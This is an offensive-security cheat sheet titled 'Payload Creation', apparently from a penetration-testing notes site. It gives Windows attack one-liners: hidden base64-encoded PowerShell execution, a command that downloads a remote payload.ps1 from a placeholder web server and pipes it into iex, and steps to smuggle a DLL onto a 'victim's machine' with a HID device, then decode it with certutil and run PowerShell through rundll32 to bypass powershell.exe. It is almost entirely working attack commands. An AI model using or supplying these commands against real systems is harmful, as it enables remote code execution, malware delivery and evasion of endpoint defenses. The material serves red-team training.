# Payload Creation

<mark style="color:red;">**Shells**</mark>

{% content-ref url="../tools/rce-remote-shell-tools/" %}
[rce-remote-shell-tools](../tools/rce-remote-shell-tools/)
{% endcontent-ref %}

#### <mark style="color:red;">One liner Powershell payload</mark>

* `Powershell -W Hidden -nop -noni -enc <base64 payload>` -> Would decode and execute the base64 Powershell payload

<mark style="color:red;">**Windows One liner to download and execute arbitrary code**</mark>

* `Powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"` -> Would use the system proxy, download and execute a ps1 file

<mark style="color:red;">**HID Payloads**</mark>

* HID device such as bash bunny or rubber ducky

<mark style="color:red;">**Running Powershell payload without using Powershell.exe**</mark>

* **Using Powershdll (**[**https://github.com/p3nt4/Powershdll**](https://github.com/p3nt4/Powershdll)**)**
  * `base64 Powershdll.dll > Powershdll_b64.txt` (converts the dll file into base64 and use a HID device to transfer this base64 data onto the victimâ€™s machine)
  * `certutil -decode Powershdll_b64.txt output.dll` (again convert the base64 chunk of data into a dll file)
  * `rundll32 output,main "Powershell script"`
  * _Run base64 encoded script using Powershdll_\
    `rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex`

